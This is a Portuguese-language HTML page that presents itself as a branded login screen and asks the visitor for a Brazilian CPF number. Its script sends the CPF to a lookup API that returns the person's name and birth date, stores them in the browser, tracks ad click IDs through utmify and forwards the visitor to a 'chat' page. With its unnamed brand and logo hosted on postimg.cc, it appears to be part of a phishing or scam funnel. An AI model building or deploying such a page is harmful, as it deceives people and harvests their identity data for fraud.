<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>• Entrar</title>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>

<script>
  window.pixelId = "696ddfa3780fe15d521af823";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>

<script>
  (function () {
    const STORE_KEY = "utm_params_all";
    const CLICK_IDS = ["fbclid", "gclid", "wbraid", "gbraid", "ttclid", "msclkid"];
    const EXTRA_KEYS = ["src", "sck", "xcod"];
    const params = new URLSearchParams(window.location.search);

    function isTrackKey(key) {
      return key.startsWith("utm_") || CLICK_IDS.includes(key) || EXTRA_KEYS.includes(key);
    }

    const fromStorage = JSON.parse(localStorage.getItem(STORE_KEY) || "{}");
    const fromUrl = {};
    params.forEach((value, key) => {
      if (isTrackKey(key) && value) fromUrl[key] = value;
    });
    const merged = { ...fromStorage, ...fromUrl };
    if (Object.keys(merged).length > 0) {
      localStorage.setItem(STORE_KEY, JSON.stringify(merged));
    }

    function withMergedParams(rawUrl) {
      if (!rawUrl || rawUrl.startsWith("#") || rawUrl.startsWith("javascript:")) return rawUrl;
      try {
        const url = new URL(rawUrl, window.location.origin);
        Object.entries(merged).forEach(([k, v]) => {
          if (!url.searchParams.has(k)) url.searchParams.set(k, v);
        });
        return url.toString();
      } catch (_) {
        return rawUrl;
      }
    }

    document.addEventListener("DOMContentLoaded", function () {
      document.querySelectorAll("a[href]").forEach((a) => {
        const href = a.getAttribute("href");
        if (!href) return;
        a.setAttribute("href", withMergedParams(href));
      });

      document.querySelectorAll("form").forEach((form) => {
        Object.entries(merged).forEach(([k, v]) => {
          if (form.querySelector(`input[name="${k}"]`)) return;
          const hidden = document.createElement("input");
          hidden.type = "hidden";
          hidden.name = k;
          hidden.value = v;
          form.appendChild(hidden);
        });
      });
    });
  })();
</script>
  
<style>
  :root{
    --rosa:#e6007e; --rosa-dark:#cc0070;
    --ink:#0f172a; --muted:#667085; --line:#e6e9ef;
    --logo-h:64px; --title-size:22px; --input-h:54px;
    --radius:12px; --btn-radius:14px; --icon-size:18px;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{
    font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
    color:var(--ink);
    background:#fff;
    display:flex;
    justify-content:center;
    align-items:flex-start;
    min-height:100vh
  }
  .wrap{width:100%;max-width:420px;padding:120px 20px 60px}

  .brand{
    display:flex;
    flex-direction:column;
    align-items:flex-start;
    margin-bottom:24px
  }
  .brand-logo{
    height:70px;
    margin-bottom:8px;
    display:block;
  }
  .brand .title{
    font-size:var(--title-size);
    font-weight:600;
    color:#0f172a
  }

  .field{position:relative;margin-bottom:20px}
  .input{
    width:100%;
    height:var(--input-h);
    padding:0 14px;
    font-size:16px;
    border:1px solid var(--line);
    border-radius:var(--radius);
    outline:none;
    transition:border-color .15s,box-shadow .15s
  }
  .input:focus{
    border-color:#cbd5e1;
    box-shadow:0 0 0 3px rgba(230,0,126,.08)
  }
  .input.error{
    border-color:#e11d48;
    box-shadow:0 0 0 3px rgba(225,29,72,.15)
  }
  .error-icon{
    position:absolute;
    top:50%;
    right:12px;
    width:var(--icon-size);
    height:var(--icon-size);
    transform:translateY(-50%);
    display:none
  }
  .hint{font-size:13px;color:#e11d48;margin-top:4px;min-height:18px}

  .switch-row{display:flex;align-items:center;gap:10px;margin:30px 0}
  .switch{
    position:relative;
    width:46px;
    height:26px;
    border-radius:999px;
    background:#e6e7ec;
    cursor:pointer;
    flex:0 0 46px;
    transition:background .2s
  }
  .switch::after{
    content:"";
    position:absolute;
    top:3px;
    left:3px;
    width:20px;
    height:20px;
    background:#fff;
    border-radius:999px;
    box-shadow:0 1px 2px rgba(0,0,0,.15);
    transition:left .2s
  }
  .switch.on{background:var(--rosa)}
  .switch.on::after{left:23px}
  .switch-label{font-size:15px;color:#0f172a}

  .btn{
    width:100%;
    border:0;
    border-radius:var(--btn-radius);
    padding:14px;
    font-weight:600;
    font-size:16px;
    cursor:not-allowed;
    background:#d9dbe2;
    color:#848b98;
    transition:filter .15s,transform .05s;
    margin:30px 0
  }
  .btn.enabled{
    cursor:pointer;
    color:#fff;
    background:linear-gradient(90deg,#ff3e9e 0%, #e6007e 100%)
  }
  .btn.enabled:active{transform:translateY(1px)}
  .btn.loading{opacity:.9;font-style:italic}

  .foot-links{
    margin:30px 0 10px;
    text-align:center;
    font-size:14px;
    line-height:1.5;
    color:var(--ink);
    font-weight:400
  }
  .foot-links .foot-highlight{
    color:var(--rosa);
    font-weight:700
  }
  .terms{
    margin-top:14px;
    text-align:center;
    font-size:13px;
    font-weight:700;
    color:var(--ink);
    line-height:1.45
  }
</style>
</head>
<body>
  <div class="wrap">
    <div class="brand">
      <img
        src="https://i.postimg.cc/BZMVKbZ5/logo2.webp"
        alt="Logo"
        class="brand-logo"
      />
      <h1 class="title">Digite seu CPF</h1>
    </div>

    <div class="field">
      <input
        id="cpf"
        class="input"
        type="tel"
        inputmode="numeric"
        autocomplete="off"
        placeholder="000.000.000-00"
        aria-label="CPF"
      />
      <img
        id="errorIcon"
        class="error-icon"
        src="https://i.postimg.cc/x1z3NG6S/img-removebg-preview.png"
        alt="Erro"
      />
      <div id="cpfHint" class="hint"></div>
    </div>

    <div class="switch-row">
      <div id="remember" class="switch" role="switch" aria-checked="false" tabindex="0"></div>
      <div class="switch-label">Lembrar CPF para o próximo acesso</div>
    </div>

    <button id="continueBtn" class="btn" type="button" disabled>Continuar</button>

    <div class="foot-links">
      Conheça aqui <strong class="foot-highlight">soluções para sua empresa</strong>.
    </div>
    <div class="terms">Termos de Uso e Política de Privacidade</div>
  </div>

<script>
(() => {
  const NEXT_URL = "../chat/index.html";
  const $cpf = document.getElementById('cpf');
  const $hint = document.getElementById('cpfHint');
  const $btn = document.getElementById('continueBtn');
  const $remember = document.getElementById('remember');
  const $icon = document.getElementById('errorIcon');
  const API_IDENT = "../api/identificacao.php";

  function maskCPF(v){
    return v.replace(/\D/g,'').slice(0,11)
      .replace(/(\d{3})(\d)/,"$1.$2")
      .replace(/(\d{3})(\d)/,"$1.$2")
      .replace(/(\d{3})(\d{1,2})$/,"$1-$2");
  }
  function hasCpfLength(cpfRaw){
    return cpfRaw.replace(/\D/g,'').length === 11;
  }
  function enableBtn(ok){
    if(ok){$btn.classList.add('enabled');$btn.disabled=false;}
    else{$btn.classList.remove('enabled');$btn.disabled=true;}
  }

  $cpf.addEventListener('input', (e)=>{
    const masked=maskCPF(e.target.value); e.target.value=masked;
    const ok=hasCpfLength(masked); enableBtn(ok);
    if(masked.replace(/\D/g,'').length<11){
      $hint.textContent="";
      $icon.style.display="none";
      $cpf.classList.remove("error");
    } else{
      $hint.textContent="";
      $icon.style.display="none";
      $cpf.classList.remove("error");
    }
  });

  const LS_KEY_CPF="site.cpf",LS_KEY_REM="site.remember";
  const savedRemember = localStorage.getItem(LS_KEY_REM) === "1";
  if(savedRemember){
    $remember.classList.add('on');
    $remember.setAttribute('aria-checked','true');
    const savedCpf = localStorage.getItem(LS_KEY_CPF)||"";
    if(savedCpf){
      $cpf.value=maskCPF(savedCpf);
      enableBtn(hasCpfLength($cpf.value));
    }
  }
  function toggleRemember(){
    const on=!$remember.classList.contains('on');
    $remember.classList.toggle('on', on);
    $remember.setAttribute('aria-checked', on ? 'true' : 'false');
    localStorage.setItem(LS_KEY_REM, on ? "1" : "0");
    if(!on){ localStorage.removeItem(LS_KEY_CPF); }
  }
  $remember.addEventListener('click', toggleRemember);
  $remember.addEventListener('keydown', (e)=>{
    if(e.key===' '||e.key==='Enter'){
      e.preventDefault();
      toggleRemember();
    }
  });

  function normalizeIdentResponse(data){
    if(!data || typeof data !== "object") return null;
    if(data.erro) return null;

    const payload = data.data && typeof data.data === "object" ? data.data : data;
    const nome = payload.nome || payload.NOME || "";
    const nascimento = payload.nascimento || payload.NASC || "";
    const cpf = payload.cpf || payload.CPF || "";

    if(!nome) return null;
    return { nome, nascimento, cpf };
  }

  async function tryEndpoint(url, cpfDigits){
    const controller = new AbortController();
    const timeoutId = setTimeout(()=>controller.abort(), 4500);
    try{
      const resp = await fetch(`${url}?cpf=${encodeURIComponent(cpfDigits)}`, {
        cache: "no-store",
        signal: controller.signal
      });
      const raw = await resp.text();
      let data = null;
      try{
        data = raw ? JSON.parse(raw) : null;
      }catch(_){
        data = null;
      }

      if(!resp.ok){
        if(resp.status === 404){
          throw new Error("API JS não encontrada no servidor (rota /api/identificacao).");
        }
        throw new Error((data && data.error) || "Falha na consulta");
      }

      if(!data){
        throw new Error("Resposta inválida da API (não retornou JSON).");
      }
      return normalizeIdentResponse(data);
    } finally{
      clearTimeout(timeoutId);
    }
  }

  async function buscarIdentificacao(cpfDigits){
    try{
      const parsed = await tryEndpoint(API_IDENT, cpfDigits);
      if(!parsed) return false;
      localStorage.setItem("site.nome", parsed.nome);
      localStorage.setItem("site.nasc", parsed.nascimento || "");
      if(parsed.cpf) localStorage.setItem("site.cpf", String(parsed.cpf).replace(/\D/g, ""));
      return true;
    }catch(err){
      const msg = String(err?.message || "");
      if(msg){
        $hint.textContent = msg;
      }
      return false;
    }
  }

  $btn.addEventListener('click', async ()=>{
    if($btn.disabled) return;
    const raw = $cpf.value.replace(/\D/g,'');
    if(localStorage.getItem(LS_KEY_REM)==="1"){
      localStorage.setItem(LS_KEY_CPF, raw);
    }
    localStorage.setItem("site.cpf", raw);
    $btn.textContent = "Consultando...";
    $btn.classList.add("loading");
    $btn.disabled = true;

    const okApi = await buscarIdentificacao(raw);
    if(!okApi){
      $btn.textContent = "Continuar";
      $btn.classList.remove("loading");
      $btn.disabled = false;
      enableBtn(true);
      if(!$hint.textContent){
        $hint.textContent = "Não foi possível validar CPF agora. Tente novamente.";
      }
      $icon.style.display = "block";
      $cpf.classList.add("error");
      return;
    }

    setTimeout(()=>{
      const params = new URLSearchParams(window.location.search);
      params.set("cpf", raw);

      window.location.href = `${NEXT_URL}?${params.toString()}`;
    }, 1800);
  });
})();
</script>
</body>
</html>
